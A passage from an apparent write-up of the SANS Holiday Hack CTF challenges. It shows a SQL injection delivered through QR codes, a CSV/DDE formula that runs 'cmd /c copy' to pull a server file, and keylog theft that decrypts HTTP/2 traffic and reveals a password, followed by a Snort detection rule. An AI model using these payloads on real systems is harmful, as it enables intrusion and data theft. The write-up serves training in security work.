+<p>The hint shows <code>avoid RDP as a control path as it depends on separate local privilege escalation flaws</code>. As a result of avoiding RDP, only <code>LDUBEJ00320@AD.KRINGLECASTLE.COM</code> user remained.</p>
+<img src=img/05-05_avoid_RDP.PNG width=700px />
+<h3 id="6-badge-manipulation">6 : Badge Manipulation</h3>
+<p><code>Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available. What is the access control number revealed by the door authentication panel?</code></p>
+<img src=img/alabaster_badge.jpg width=300px />
+<p>Here is authentication system.
+There are two kinds of input.
+The first method is to upload the QR code from the USB mark. The other method is to click the fingerprint authentication mark.</p>
+<img src=img/06-01_Badge_Scan.PNG width=700px />
+<h4 id="solution1-upload-qr-code-from-the-usb-mark">Solution1: Upload QR code from the USB mark.</h4>
+<p>First, I decoded the given ALABASTER SNOWBALL's QR code.</p>
+<pre class="hljs"><code><div>root@kali~/work# zbarimg alabaster_badge.jpg 
+QR-Code:oRfjg5uGHmbduj2m
+scanned 1 barcode symbols from 1 images in 0.03 seconds
+</div></code></pre>
+<p>I guessed that the following SQL statement would be executed inside the authentication system.</p>
+<p><code>SELECT ??? FROM ??? WHERE ?Secret_Code?=&lt;Decoded_QRcode&gt;</code></p>
+<p>So I created a QR code with the meaning of single-quote(') aiming at SQL error.</p>
+<pre class="hljs"><code><div>root@kali~/work# qrencode -o 06_single_quote.png \'
+
+root@kali~/work# zbarimg 06_single_quote.png 
+QR-Code:'
+scanned 1 barcode symbols from 1 images in 0 seconds
+</div></code></pre>
+<img src=img/06-02_QR_Single_Quote.PNG width=300px />
+<p>At this time I read javascript and found that only png is allowed.</p>
+<pre class="hljs"><code><div>...(snip)...
+    if (!allowed_extensions.includes(file_extension)) {
+      set_green(<span class="hljs-literal">false</span>)
+      $(<span class="hljs-string">'#result_text'</span>).text(<span class="hljs-string">'PNG Files Only'</span>);
+...(snip)...
+</div></code></pre>
+<p>When uploading the created QR code, an exception error appeared.</p>
+<img src=img/06-03_EXCEPTION.png width=700px />
+<p>Response returned in JSON format as displayed contents.</p>
+<img src=img/06-04_EXCEPTION_response_json.png width=700px />
+<pre class="hljs"><code><div>EXCEPTION AT (LINE 96 
+&quot;user_info = query(&quot;SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1&quot;.format(uid))&quot;
+): (1064, u&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1&quot;)
+</div></code></pre>
+<ul>
+<li>DB server is MariaDB</li>
+<li>I got the SQL query to be executed.</li>
+</ul>
+<p><code>&quot;SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1&quot;.format(uid))</code></p>
+<p>Next I created a QR code to bypass WHERE Clause.</p>
+<blockquote>
+<p>SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '<code>'OR'A'='A</code>' LIMIT 1</p>
+</blockquote>
+<pre class="hljs"><code><div>root@kali~/work# qrencode -o 06_bypass_where.png \'OR\'A\'=\'A
+
+root@kali~/work# zbarimg 06_bypass_where.png 
+QR-Code:'OR'A'='A
+scanned 1 barcode symbols from 1 images in 0 seconds
+</div></code></pre>
+<p>When uploading the created QR code, a different error message was displayed.</p>
+<img src=img/06-05_EXCEPTION_DISABLED.png width=700px />
+<p><code>Authorized User Account Has Been Disabled!</code></p>
+<p>I looked at the SQL statement again and noticed a column named enabled in the employees table.
+So I created a QR code to check the value of enable in the WHERE clause.</p>
+<blockquote>
+<p>SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '<code>'OR'A'='A'AND enabled=1 #</code>' LIMIT 1</p>
+</blockquote>
+<pre class="hljs"><code><div>root@kali~/work# qrencode -o 06_bypass_auth.png &quot;'OR'A'='A'AND enabled=1 # &quot; 
+
+root@kali~/work# zbarimg 06_bypass_auth.png
+QR-Code:'OR'A'='A'AND enabled=1 # 
+scanned 1 barcode symbols from 1 images in 0.01 seconds
+</div></code></pre>
+<p>When uploading the created QR code, I succeeded in bypassing authentication.</p>
+<img src=img/06-06_USER_ACCESS_GRANTED.png width=700px />
+<p>The response at that time is as follows.</p>
+<img src=img/06-07_USER_ACCESS_GRANTED_response.png width=700px />
+<p><code>User Access Granted - Control number 19880715</code>.</p>
+<p>So access control number is <code>19880715</code>.</p>
+<h4 id="solution2-click-the-fingerprint-authentication-mark">Solution2: Click the fingerprint authentication mark.</h4>
+<p>I clicked the fingerprint authentication mark in upper right.</p>
+<img src=img/06-08_fingerprint_touch.png width=700px />
+<p>The result is here.</p>
+<img src=img/06-09_fingerprint_QR_CODE_NOT_FOUND.png width=700px />
+<p><code>QR Code Not Found. Only QR Code and White Space may be visible!</code></p>
+<p>The request at that time is as follows.
+This request is a POST method and the request body has a parameter called b64barcode.</p>
+<img src=img/06-10_fingerprint_request.png width=700px />
+<p>b64barcode parameter contains the base64 encoded image data.
+The image data you are sending is the following.</p>
+<img src=img/06-11_fingerprint_default_image.PNG width=700px />
+<p>I tried to send a QR code that bypassed the authentication in Solution 1.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> base64
+
+img = open(<span class="hljs-string">"06_bypass_auth.png"</span>, <span class="hljs-string">"rb"</span>).read()
+img_enc = base64.b64encode(img)
+
+payload = {<span class="hljs-string">'b64barcode'</span>: img_enc}
+headers = {<span class="hljs-string">'Cookie'</span>: <span class="hljs-string">'resource_id=8ba72b47-8abd-4d77-a0b3-4f231bd1c785'</span>}
+url = <span class="hljs-string">'https://scanomatic.kringlecastle.com/upload'</span>
+
+r = requests.post(url,headers=headers, data=payload)
+print(r.text)
+</div></code></pre>
+<pre class="hljs"><code><div>&gt;python 06_fingerprint.py
+{&quot;data&quot;:&quot;User Access Granted - Control number 19880715&quot;,&quot;request&quot;:true,&quot;success&quot;:{&quot;hash&quot;:&quot;5c5913881bd850087c5f389a1a0d57bc5eb5a4856de23246f7d9dd7d0e1ff4f4&quot;,&quot;resourceId&quot;:&quot;8ba72b47-8abd-4d77-a0b3-4f231bd1c785&quot;}}
+</div></code></pre>
+<p>As a result, I got the access control number in this way.
+Access control number is <code>19880715</code>.</p>
+<h3 id="7-hr-incident-response">7 : HR Incident Response</h3>
+<p><code>Gain access to the website(https://careers.kringlecastle.com/) and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with &quot;K.&quot;</code></p>
+<p>Investigate the web site: https://careers.kringlecastle.com/</p>
+<img src=img/07-01_TopPage.PNG width=700px />
+<p>When accessing <code>/candidate_evaluation.docx</code> 404 ERROR returned.</p>
+<img src=img/07-02_404_NOT_FOUND.PNG width=700px />
+<ul>
+<li>The public directory of the webpage is <code>C:\careerportal\resources\public\</code></li>
+<li>URL is <code>https://careers.kringlecastle.com/public/</code></li>
+</ul>
+<p>Therefore, the purpose is to copy the file from <code>C:\candidate_evaluation.docx</code> to <code>C:\careerportal\resources\public\candidate_evaluation.docx</code>.</p>
+<p>CSV file can be uploaded from webpage form.</p>
+<img src=img/07-03_TopPage_Form.PNG width=400px />
+<p>If the administrator opens the csv file with excel, it may be able to exploit the DDE function.
+So I created the CSV file that copies files using the DDE function like the following.</p>
+<pre class="hljs"><code><div>=cmd|'/c copy &quot;C:\candidate_evaluation.docx&quot; &quot;C:\careerportal\resources\public\07_E5IbdUcGW6Exg.docx&quot; '!A0
+</div></code></pre>
+<p>After uploading the CSV file, I can download the file by accessing the following URL.
+https://careers.kringlecastle.com/public/07_E5IbdUcGW6Exg.docx</p>
+<img src=img/07-04_docx.PNG width=700px />
+<blockquote>
+<p>Furthermore, there is intelligence from the North Pole this elf is linked to cyber terrorist organization <code>Fancy Beaver</code> who openly provides technical support to the villains that attacked our Holidays last year.</p>
+</blockquote>
+<p><code>Fancy Beaver</code> is secretly supported by Krampus.</p>
+<h3 id="8-network-traffic-forensics">8 : Network Traffic Forensics</h3>
+<p><code>Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball?</code></p>
+<blockquote>
+<p>Hint: A elf found this out by looking at HTML comments left behind and was able to grab the server-side source code.</p>
+</blockquote>
+<p>Investigate the web site: https://packalyzer.kringlecastle.com/</p>
+<img src=img/08-01_TopPage.PNG width=500px />
+<p>I registered the user first and then logged in.</p>
+<img src=img/08-02_Logined.PNG width=700px />
+<p>By checking the source code of html, there was a javascript comment like the following.</p>
+<blockquote>
+<p>//File upload Function. All extensions and sizes are validated server-side in <code>app.js</code></p>
+</blockquote>
+<p>I tried several URLs and found the server side <code>app.js</code> source code in the following URL.
+https://packalyzer.kringlecastle.com/pub/app.js</p>
+<p>I need to obtain SSLKEYLOGFILE in order to decode the https communication acquired by the web server.
+When I read app.js, I can see that SSLKEYLOGFILE is saved from the following code.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">const</span> key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )
+<span class="hljs-keyword">const</span> options = {
+  <span class="hljs-attr">key</span>: fs.readFileSync(__dirname + <span class="hljs-string">'/keys/server.key'</span>),
+  <span class="hljs-attr">cert</span>: fs.readFileSync(__dirname + <span class="hljs-string">'/keys/server.crt'</span>),
+  <span class="hljs-attr">http2</span>: {
+    <span class="hljs-attr">protocol</span>: <span class="hljs-string">'h2'</span>,         <span class="hljs-comment">// HTTP2 only. NOT HTTP1 or HTTP1.1</span>
+    protocols: [ <span class="hljs-string">'h2'</span> ],
+  },
+  <span class="hljs-attr">keylog</span> : key_log_path     <span class="hljs-comment">//used for dev mode to view traffic. Stores a few minutes worth at a time</span>
+};
+</div></code></pre>
+<p>SSLKEYLOGFILE is stored in <code>__dirname + process.env.DEV + process.env.SSLKEYLOGFILE</code>. It is necessary to identify <code>__dirname</code>, <code>process.env.DEV</code> and <code>process.env.SSLKEYLOGFILE</code>.
+Extract noteworthy parts from app.js.</p>
+<pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_envs</span>(<span class="hljs-params"></span>) </span>{
+  <span class="hljs-keyword">var</span> dirs = []
+  <span class="hljs-keyword">var</span> env_keys = <span class="hljs-built_in">Object</span>.keys(process.env)
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i &lt; env_keys.length; i++) {
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> process.env[env_keys[i]] === <span class="hljs-string">"string"</span> ) {
+      dirs.push(( <span class="hljs-string">"/"</span>+env_keys[i].toLowerCase()+<span class="hljs-string">'/*'</span>) )
+    }
+  }
+  <span class="hljs-keyword">return</span> uniqueArray(dirs)
+}
+<span class="hljs-keyword">if</span> (dev_mode) {
+    <span class="hljs-comment">//Can set env variable to open up directories during dev</span>
+    <span class="hljs-keyword">const</span> env_dirs = load_envs();
+} <span class="hljs-keyword">else</span> {
+    <span class="hljs-keyword">const</span> env_dirs = [<span class="hljs-string">'/pub/'</span>,<span class="hljs-string">'/uploads/'</span>];
+}
+
+router.get(env_dirs,  <span class="hljs-keyword">async</span> (ctx, next) =&gt; {
+<span class="hljs-keyword">try</span> {
+    <span class="hljs-keyword">var</span> Session = <span class="hljs-keyword">await</span> sessionizer(ctx);
+    <span class="hljs-comment">//Splits into an array delimited by /</span>
+    <span class="hljs-keyword">let</span> split_path = ctx.path.split(<span class="hljs-string">'/'</span>).clean(<span class="hljs-string">""</span>);
+    <span class="hljs-comment">//Grabs directory which should be first element in array</span>
+    <span class="hljs-keyword">let</span> dir = split_path[<span class="hljs-number">0</span>].toUpperCase();
+    split_path.shift();
+    <span class="hljs-keyword">let</span> filename = <span class="hljs-string">"/"</span>+split_path.join(<span class="hljs-string">'/'</span>);
+    <span class="hljs-keyword">while</span> (filename.indexOf(<span class="hljs-string">'..'</span>) &gt; <span class="hljs-number">-1</span>) {
+    filename = filename.replace(<span class="hljs-regexp">/\.\./g</span>,<span class="hljs-string">''</span>);
+    }
+    <span class="hljs-keyword">if</span> (![<span class="hljs-string">'index.html'</span>,<span class="hljs-string">'home.html'</span>,<span class="hljs-string">'register.html'</span>].includes(filename)) {
+    ctx.set(<span class="hljs-string">'Content-Type'</span>,mime.lookup(__dirname+(process.env[dir] || <span class="hljs-string">'/pub/'</span>)+filename))
+    ctx.body = fs.readFileSync(__dirname+(process.env[dir] || <span class="hljs-string">'/pub/'</span>)+filename)
+    } <span class="hljs-keyword">else</span> {
+    ctx.status=<span class="hljs-number">404</span>;
+    ctx.body=<span class="hljs-string">'Not Found'</span>;
+    }
+} <span class="hljs-keyword">catch</span> (e) {
+    ctx.body=e.toString();
+}
+});
+</div></code></pre>
+<p>After calling <code>load_envs()</code> the <code>env_dirs</code> contains the following data.</p>
+<pre class="hljs"><code><div>env_dirs
+[ '/path/*',
+  '/dev/*',
+  '/sslkeylogfile/*,
+  ...]
+ ```
+</div></code></pre>
+<p>Therefore, when I access <code>https://packalyzer.kringlecastle.com/sslkeylogfile/</code>, the process transitions to the function specified by the second argument of <code>router.get()</code>.</p>
+<p>The local variable <code>dir</code> is <code>SSLKEYLOGFILE</code>.
+Therefore, it tries to read the file of &quot;<code>__dirname + process.env['SSLKEYLOGFILE'] + filename</code>&quot;.
+If the file does not exist, the file path is displayed as an error.</p>
+<p>Request the next to examine three variables (<code>__dirname</code>, <code>process.env.DEV</code> and <code>process.env.SSLKEYLOGFILE</code>)</p>
+<pre class="hljs"><code><div>root@kali~/work# curl 'https://packalyzer.kringlecastle.com/sslkeylogfile/a'; echo
+Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/a'
+
+root@kali~/work# curl 'https://packalyzer.kringlecastle.com/dev/a'; echo
+Error: ENOENT: no such file or directory, open '/opt/http2/dev//a'
+</div></code></pre>
+<ul>
+<li>__dirname == <code>/opt/http2</code></li>
+<li>process.env.DEV == <code>/dev/</code></li>
+<li>process.env.SSLKEYLOGFILE == <code>packalyzer_clientrandom_ssl.log</code></li>
+</ul>
+<p>Therefore, SSLKEYLOGFILE for decrypting the https communication acquired by the server can be obtained at the following URL.</p>
+<p>https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log</p>
+<pre class="hljs"><code><div>root@kali~/work# curl 'https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log'
+CLIENT_RANDOM 1B36D2205C96A8C71B07CBA6B2773A883892CB7E07A72B38F5A36AC83A8C3855 ED90DBF8CB4E606AB364127F5D8D7E6CFDC38AF490ABDADD87C47D0971CB623A895946933778C5CC39AAA2A343E06B13
+CLIENT_RANDOM 6E44A324A1858A31245A35C13125C19C31E1BE2BE020BBE69A17FADC97E1CBCC 883DCFFF1CDE63ECF3EFBC68F82E3D7EA7B42C1437C75FABEDDC4EA6223FC563FA376DC586AD8DC9EB1822A25EAE36BE
+CLIENT_RANDOM 372274E99D6B9512C290F3F09B09F6578C43BECD202F0E645953B24B7C19AD4B 25B981C0E9A6A6C1B305B10CDBC6A45A6ED6DB8B2EBB140ED364075CC5058CA2FE25DCE3AEE3456B1D0AF13F89665078
+...(snip)...
+</div></code></pre>
+<p>Next, I get communication of server.
+I clicked the <code>SNIFF TRAFFIC</code> button after logging in.</p>
+<img src=img/08-03_Sniffing.PNG width=700px />
+<p>After 20 seconds, I can download the traffic by pressing the <code>Captures</code> button on the top right.</p>
+<img src=img/08-04_Sniffing-Download.PNG width=700px />
+<p>Also obtain SSLKEYLOGFILE at the same time.</p>
+<pre class="hljs"><code><div>root@kali~/work# curl 'https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log' -o 08_packalyzer_clientrandom_ssl.log
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 42064  100 42064    0     0  12083      0  0:00:03  0:00:03 --:--:-- 12083
+</div></code></pre>
+<p>And I used tshark to decrypt the ssl communication.</p>
+<pre class="hljs"><code><div>root@kali~/work# tshark -nr 89940429_6-1-2019_0-37-28.pcap -o ssl.keylog_file:08_packalyzer_clientrandom_ssl.log -Y 'http2.headers.method==&quot;GET&quot;' 2&gt;/dev/null
+   14   0.013422 10.126.0.104 → 10.126.0.3   HTTP2 221 HEADERS[1]: GET /
+   64   0.066933 10.126.0.104 → 10.126.0.3   HTTP2 257 HEADERS[1]: GET /
+  100   3.017706 10.126.0.105 → 10.126.0.3   HTTP2 221 HEADERS[1]: GET /
+  109   3.019027 10.126.0.106 → 10.126.0.3   HTTP2 221 HEADERS[1]: GET /
+  194   3.071777 10.126.0.105 → 10.126.0.3   HTTP2 256 HEADERS[1]: GET /
+  215   3.077752 10.126.0.106 → 10.126.0.3   HTTP2 256 HEADERS[1]: GET /
+  241   7.017298 10.126.0.106 → 10.126.0.3   HTTP2 221 HEADERS[1]: GET /
+  291   7.070745 10.126.0.106 → 10.126.0.3   HTTP2 258 HEADERS[1]: GET /
+  316  10.020008 10.126.0.104 → 10.126.0.3   HTTP2 221 HEADERS[1]: GET /
+  363  10.073372 10.126.0.104 → 10.126.0.3   HTTP2 256 HEADERS[1]: GET /
+
+root@kali~/work# tshark -nr 89940429_6-1-2019_0-37-28.pcap -o ssl.keylog_file:08_packalyzer_clientrandom_ssl.log -Y 'http2.headers.method==&quot;POST&quot;' 2&gt;/dev/null
+   40   0.042445 10.126.0.104 → 10.126.0.3   HTTP2 299 HEADERS[1]: POST /api/login
+  145   3.045470 10.126.0.105 → 10.126.0.3   HTTP2 298 HEADERS[1]: POST /api/login
+  159   3.048710 10.126.0.106 → 10.126.0.3   HTTP2 298 HEADERS[1]: POST /api/login
+  266   7.045143 10.126.0.106 → 10.126.0.3   HTTP2 300 HEADERS[1]: POST /api/login
+  339  10.047917 10.126.0.104 → 10.126.0.3   HTTP2 298 HEADERS[1]: POST /api/login
+</div></code></pre>
+<p>Probably because <code>POST /api/login</code> requests contains credential information, it searches for <code>Holly Evergreen</code> or <code>Alabaster Snowball</code> credential information.
+The tshark display filter was set with the following items.</p>
+<ul>
+<li>Request to server : <code>ip.dst_host == 10.126.0.3</code></li>
+<li>The payload contains either alabaster or holly : <code>http2.data.data matches alabaster or http2 matches holly</code></li>
+</ul>
+<p>As a result, the display filter was set as follows.</p>
+<blockquote>
+<p>ip.dst_host == 10.126.0.3 and (http2.data.data matches alabaster or http2 matches holly)</p>
+</blockquote>
+<pre class="hljs"><code><div>root@kali~/work# tshark -Px -nr 89940429_6-1-2019_0-37-28.pcap -o ssl.keylog_file:08_packalyzer_clientrandom_ssl.log -Y &quot;ip.dst_host == 10.126.0.3 and (http2.data.data matches alabaster or http2 matches holly)&quot; 2&gt;/dev/null
+   42   0.042498 10.126.0.104 → 10.126.0.3   HTTP2 202 DATA[1] (application/json)
+
+Frame (202 bytes):
+0000  00 00 00 00 00 00 00 00 00 00 00 00 08 00 45 00   ..............E.
+0010  00 bc 6d 0e 40 00 40 06 b7 c7 0a 7e 00 68 0a 7e   ..m.@.@....~.h.~
+0020  00 03 9f 0d 01 bb 3b a9 b9 2d 8d c5 9a af 80 18   ......;..-......
+0030  05 55 16 15 00 00 01 01 08 0a 01 0a db 45 01 0a   .U...........E..
+0040  db 45 17 03 03 00 83 1e 60 eb d6 c0 22 45 b1 a5   .E......`...&quot;E..
+0050  5f dc 93 80 8f 56 f0 5f 9e f3 ce bd 4c 2e d7 ce   _....V._....L...
+0060  7f 22 cc 24 6d cd 46 1e 3a 6e af 8a ef 89 98 cd   .&quot;.$m.F.:n......
+0070  70 4b 2f 44 92 a8 83 94 7a 60 28 47 f3 18 4a 23   pK/D....z`(G..J#
+0080  20 65 af 04 b7 be 67 74 1e b9 b6 63 d8 c6 a9 36    e....gt...c...6
+0090  ab 44 48 0b e9 82 f0 5c 91 6a 0e 2b 04 17 04 8e   .DH....\.j.+....
+00a0  1e bb fc f0 58 ac e3 eb 0f 3f a0 c5 ad 8f 5e d7   ....X....?....^.
+00b0  22 49 87 29 f2 16 3e 4b d6 5c 8f 52 a7 6a 09 e4   &quot;I.)..&gt;K.\.R.j..
+00c0  7a 28 5b 20 76 91 f0 75 6a 37                     z([ v..uj7
+Decrypted SSL (107 bytes):
+0000  00 00 62 00 01 00 00 00 01 1f 8b 08 08 ce 4d 31   ..b...........M1
+0010  5c 00 03 35 37 4a 42 37 39 35 42 50 46 2e 74 6d   \..57JB795BPF.tm
+0020  70 00 ab 56 2a 2d 4e 2d ca 4b cc 4d 55 b2 52 50   p..V*-N-.K.MU.RP
+0030  4a cc 49 4c 4a 2c 2e 49 2d 52 d2 51 50 2a 48 2c   J.ILJ,.I-R.QP*H,
+0040  2e 2e cf 2f 4a 01 49 04 24 26 67 a7 16 e9 16 38   .../J.I.$&amp;g....8
+0050  14 a5 ea 96 94 16 e5 95 24 26 e5 a4 1a 5a 1a 29   ........$&amp;...Z.)
+0060  d5 02 00 3a dc 68 d6 41 00 00 00                  ...:.h.A...
+Uncompressed entity body (65 bytes):
+0000  7b 22 75 73 65 72 6e 61 6d 65 22 3a 20 22 61 6c   {&quot;username&quot;: &quot;al
+0010  61 62 61 73 74 65 72 22 2c 20 22 70 61 73 73 77   abaster&quot;, &quot;passw
+0020  6f 72 64 22 3a 20 22 50 61 63 6b 65 72 2d 70 40   ord&quot;: &quot;Packer-p@
+0030  72 65 2d 74 75 72 6e 74 61 62 6c 65 31 39 32 22   re-turntable192&quot;
+0040  7d                                                }
+
+  341  10.048738 10.126.0.104 → 10.126.0.3   HTTP2 202 DATA[1] (application/json)
+
+Frame (202 bytes):
+0000  00 00 00 00 00 00 00 00 00 00 00 00 08 00 45 00   ..............E.
+0010  00 bc d1 b1 40 00 40 06 53 24 0a 7e 00 68 0a 7e   ....@.@.S$.~.h.~
+0020  00 03 e3 2f 01 bb f6 83 37 95 01 8b 0a 41 80 18   .../....7....A..
+0030  05 55 16 15 00 00 01 01 08 0a 01 0a e5 0b 01 0a   .U..............
+0040  e5 0b 17 03 03 00 83 06 40 a0 a9 69 e3 21 65 ff   ........@..i.!e.
+0050  db bb 83 bd 49 2c 96 9a 7e 38 18 c2 cf a0 16 06   ....I,..~8......
+0060  ba ce 38 67 87 b6 1d 17 b8 7e 11 bd 63 5c dc 96   ..8g.....~..c\..
+0070  5b 55 78 b0 54 4b 99 b2 b4 0d a7 63 c7 94 97 25   [Ux.TK.....c...%
+0080  36 72 94 77 1b 99 c1 8c fd 78 f9 6d d1 30 ea e0   6r.w.....x.m.0..
+0090  59 42 18 15 b7 cd 91 3a e4 52 66 08 b7 d8 80 a1   YB.....:.Rf.....
+00a0  f6 c2 3e 2e 35 7e 25 3a 86 02 69 54 10 7f 3a 1f   ..&gt;.5~%:..iT..:.
+00b0  ed 21 1d 77 b6 36 4d 1b a4 54 c9 c3 f1 a4 ee 34   .!.w.6M..T.....4
+00c0  a7 01 0c 56 c9 02 ae 37 6c 9a                     ...V...7l.
+Decrypted SSL (107 bytes):
+0000  00 00 62 00 01 00 00 00 01 1f 8b 08 08 d8 4d 31   ..b...........M1
+0010  5c 00 03 4e 36 31 5a 38 4c 47 41 42 45 2e 74 6d   \..N61Z8LGABE.tm
+0020  70 00 ab 56 2a 2d 4e 2d ca 4b cc 4d 55 b2 52 50   p..V*-N-.K.MU.RP
+0030  4a cc 49 4c 4a 2c 2e 49 2d 52 d2 51 50 2a 48 2c   J.ILJ,.I-R.QP*H,
+0040  2e 2e cf 2f 4a 01 49 04 24 26 67 a7 16 e9 16 38   .../J.I.$&amp;g....8
+0050  14 a5 ea 96 94 16 e5 95 24 26 e5 a4 1a 5a 1a 29   ........$&amp;...Z.)
+0060  d5 02 00 3a dc 68 d6 41 00 00 00                  ...:.h.A...
+Uncompressed entity body (65 bytes):
+0000  7b 22 75 73 65 72 6e 61 6d 65 22 3a 20 22 61 6c   {&quot;username&quot;: &quot;al
+0010  61 62 61 73 74 65 72 22 2c 20 22 70 61 73 73 77   abaster&quot;, &quot;passw
+0020  6f 72 64 22 3a 20 22 50 61 63 6b 65 72 2d 70 40   ord&quot;: &quot;Packer-p@
+0030  72 65 2d 74 75 72 6e 74 61 62 6c 65 31 39 32 22   re-turntable192&quot;
+0040  7d                                                }
+</div></code></pre>
+<p>I found credentials in JSON data.</p>
+<pre class="hljs"><code><div>{
+    <span class="hljs-attr">"username"</span>: <span class="hljs-string">"alabaster"</span>, 
+    <span class="hljs-attr">"password"</span>: <span class="hljs-string">"Packer-p@re-turntable192"</span>
+}
+</div></code></pre>
+<p>Log off the website once and log in to the system using this credential.
+I pressed the <code>Captures</code> button and confirmed <code>Saved Pcaps</code>, I found a pcap file named <code>super_secret_packet_capture.pcap</code>.
+And I downloaded it.</p>
+<img src=img/08-05_alabaster-captures.PNG width=700px />
+<p>In that pcap there was SMTP communication of mail sent from <code>Holly Evergreen</code> to <code>Alabaster Snowball</code>.</p>
+<img src=img/08-06_SMTP.PNG width=400px />
+<pre class="hljs"><code><div>Date: Fri, 28 Sep 2018 11:33:17 -0400
+To: alabaster.snowball@mail.kringlecastle.com
+From: Holly.evergreen@mail.kringlecastle.com
+Subject: test Fri, 28 Sep 2018 11:33:17 -0400
+--------------------------------------
+Hey alabaster, 
+
+Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.
+</div></code></pre>
+<p>And a PDF file was attached.</p>
+<img src=img/08-07_SMTP_attachPDF.PNG width=700px />
+<blockquote>
+<p>We’ve just taken Mary Had a Little Lamb from Bb to A!</p>
+</blockquote>
+<p>Therefore, the name of the song described in the document sent from <code>Holly Evergreen</code> to <code>Alabaster Snowball</code> is <code>Mary Had a Little Lamb</code>.</p>
+<h3 id="9-ransomware-recovery">9 : Ransomware Recovery</h3>
+<p><code>Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks.</code></p>
+<h4 id="9-1-catch-the-malware">9-1 : Catch the Malware</h4>
+<p><code>Then create a rule that will catch all new infections. What is the success message displayed by the Snort terminal?</code></p>
+<p>I can download traffic on https://elf:onashelf@snortsensor1.kringlecastle.com/
+Download one pcap file and check it with tshark.</p>
+<pre class="hljs"><code><div>root@kali~/work# tshark -nr snort.log.1546743472.3595235.pcap 2&gt;/dev/null
+    1   0.000000 10.126.0.117 → 77.88.55.60  DNS 74 Standard query 0x72cb TXT maloney.fosterhood.yandex.ru
+    2   0.010166  77.88.55.60 → 10.126.0.117 DNS 131 Standard query response 0x72cb TXT maloney.fosterhood.yandex.ru TXT
+    3   0.020368 10.126.0.186 → 23.198.46.6  DNS 99 Standard query 0xd4cd TXT 77616E6E61636F6F6B69652E6D696E2E707331.rgruhnbeas.com
+    4   0.030553  23.198.46.6 → 10.126.0.186 DNS 167 Standard query response 0xd4cd TXT 77616E6E61636F6F6B69652E6D696E2E707331.rgruhnbeas.com TXT
+    5   0.040731  10.126.0.35 → 201.160.23.89 DNS 99 Standard query 0x6e93 TXT 77616E6E61636F6F6B69652E6D696E2E707331.urhgbesran.org
+    6   0.050974 201.160.23.89 → 10.126.0.35  DNS 167 Standard query response 0x6e93 TXT 77616E6E61636F6F6B69652E6D696E2E707331.urhgbesran.org TXT
+    7   0.061158  10.126.0.91 → 198.11.132.250 DNS 69 Standard query 0x45e7 TXT myxomata.aliexpress.com
+    8   0.071330 198.11.132.250 → 10.126.0.91  DNS 152 Standard query response 0x45e7 TXT myxomata.aliexpress.com TXT
+...(snip)...
+</div></code></pre>
+<p>All packets of pcap was communication of DNS TXT record.
+Perhaps the malware communicates in covert channel of DNS TXT records.
+I judged the domain by normal communication or malware communication.</p>
+<ul>
+<li>benign
+<ul>
+<li>maloney.fosterhood.yandex.ru</li>
+<li>myxomata.aliexpress.com</li>
+<li>scranton.twitter.com</li>
+<li>herculanean.extraperiodic.twitter.com</li>
+<li>thiamid.hexameric.sina.com.cn</li>
+<li>(others)...</li>
+</ul>
+</li>
+<li>malicious
+<ul>
+<li>77616E6E61636F6F6B69652E6D696E2E707331.rgruhnbeas.com</li>
+<li>77616E6E61636F6F6B69652E6D696E2E707331.urhgbesran.org</li>
+<li>0.77616E6E61636F6F6B69652E6D696E2E707331.urhgbesran.org</li>
+<li>0.77616E6E61636F6F6B69652E6D696E2E707331.rgruhnbeas.com</li>
+<li>(others)...</li>
+</ul>
+</li>
+</ul>
+<p>Perhaps malware communication has a string of domain name <code>77616E6E61636F6F6B69652E6D696E2E707331</code>.</p>
+<p>Decoding <code>77616E6E61636F6F6B69652E6D696E2E707331</code> as hexadecimal means <code>wannacookie.min.ps1</code>.</p>
+<pre class="hljs"><code><div>root@kali~/work# echo 77616E6E61636F6F6B69652E6D696E2E707331 | xxd -r -p
+wannacookie.min.ps1
+</div></code></pre>
+<p>Perhaps it is the dropper that is doing this communication and you have downloaded the powershell script <code>wannacookie.min.ps1</code> from the server.
+Therefore I wrote the snort rule based on the character string <code>77616E6E61636F6F6B69652E6D696E2E707331</code>.</p>
+<pre class="hljs"><code><div>elf@26f5a5c1d957:~$ cat &gt; /etc/snort/rules/local.rules 
+alert udp $HOME_NET any -&gt; $EXTERNAL_NET 53 (msg:&quot;[wannacookie]DNS TXT record(request)&quot;; content:&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; sid:10000001; rev:1;)
+alert udp $EXTERNAL_NET 53 -&gt; $HOME_NET any (msg:&quot;[wannacookie]DNS TXT record(response)&quot;; content:&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; sid:10000002; rev:1;)
+elf@26f5a5c1d957:~$ 
+[+] Congratulation! Snort is alerting on all ransomware and only the ransomware! 
+[+]  
+</div></code></pre>
